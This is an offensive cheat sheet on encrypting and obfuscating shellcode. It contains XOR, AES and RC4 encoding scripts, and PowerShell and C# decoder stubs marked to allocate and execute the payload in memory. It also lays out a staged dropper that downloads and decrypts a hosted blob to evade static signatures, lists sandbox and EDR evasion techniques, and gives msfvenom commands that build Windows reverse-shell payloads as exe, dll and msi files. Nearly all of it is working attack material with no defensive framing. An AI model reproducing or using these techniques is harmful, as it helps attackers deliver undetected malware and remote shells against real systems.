# Shellcode Encryption & Obfuscation

## XOR Encoding

```python
def xor_encode(shellcode: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(shellcode)])

# Example: generate XOR-encoded shellcode blob
with open("shellcode.bin", "rb") as f:
    raw = f.read()
key = b"\xde\xad\xbe\xef"
encoded = xor_encode(raw, key)
print(",".join(f"0x{b:02x}" for b in encoded))
```

**PowerShell decoder stub**
```powershell
$key  = [byte[]](0xde, 0xad, 0xbe, 0xef)
$enc  = [byte[]](0x..., ...)   # paste encoded bytes
$dec  = New-Object byte[] $enc.Length
for ($i = 0; $i -lt $enc.Length; $i++) { $dec[$i] = $enc[$i] -bxor $key[$i % $key.Length] }
# Allocate + execute $dec via VirtualAlloc / CreateThread
```

---

## AES-256 Encryption (Python)

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

key = os.urandom(32)   # 256-bit key
iv  = os.urandom(16)

with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(shellcode, 16))

print(f"KEY: {key.hex()}")
print(f"IV:  {iv.hex()}")
print(f"ENC: {encrypted.hex()}")
```

**C# decryptor stub**
```csharp
using System.Security.Cryptography;
byte[] key = Convert.FromHexString("KEY_HEX");
byte[] iv  = Convert.FromHexString("IV_HEX");
byte[] enc = Convert.FromHexString("ENC_HEX");
using var aes = Aes.Create();
aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC;
var dec = aes.CreateDecryptor().TransformFinalBlock(enc, 0, enc.Length);
// Allocate + exec dec
```

---

## RC4 Encoding

```python
from Crypto.Cipher import ARC4
key = b"my_rc4_key_here"
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()
cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)
```

---

## Staged Delivery (avoid embedding in binary)

```
1. Generate raw shellcode: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o sc.bin
2. Encrypt with AES/XOR
3. Host encrypted blob on HTTPS server
4. Dropper: download at runtime → decrypt in memory → execute
   (no shellcode bytes in dropper binary → evades static signatures)
```

---

## Polymorphic / Obfuscation Techniques

| Technique | Effect |
|-----------|--------|
| Random key per build | Same payload has different bytes each compile |
| NOP sled variants | Insert random `xchg rax,rax` / math no-ops between instructions |
| Sleep before exec | Sandbox timeout evasion: `Sleep(10000)` then check timing |
| Parent process check | Exit if not spawned by expected parent (sandbox detection) |
| Direct syscalls | Bypass userland EDR hooks on allocation/threading APIs |

---

## msfvenom Common Formats

```bash
# Staged reverse shell (requires handler)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP LPORT=4444 -f raw -o staged.bin

# Stageless (self-contained)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o evil.dll

# MSI (for AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi

# PowerShell
msfvenom -p cmd/windows/reverse_powershell LHOST=IP LPORT=4444
```
